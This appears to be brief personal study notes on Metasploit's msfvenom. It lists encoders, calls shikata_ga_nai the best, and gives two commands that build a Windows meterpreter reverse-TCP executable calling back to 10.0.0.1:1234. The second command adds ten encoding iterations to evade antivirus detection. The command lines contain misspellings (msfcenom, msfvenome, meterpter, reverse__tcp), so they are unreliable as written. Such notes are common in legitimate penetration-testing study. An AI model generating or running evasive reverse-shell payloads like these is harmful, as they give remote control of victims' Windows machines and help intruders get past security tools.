

- msfcenom --list encoders
- shikata ga nai , is best encoder
- msfvenome -p windows/meterpter/reverse__tcp LHOST=10.0.0.1 LPORT=1234 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_payloads/encoded86.exe
- we can increase more iterations of encoding with exaple 10 iterations is -i 10 
- msfvenome -p windows/meterpter/reverse__tcp LHOST=10.0.0.1 LPORT=1234 -i 10 -e x86/shikata_ga_nai -f exe > ~/Desktop/Windows_payloads/encoded86.exe
- 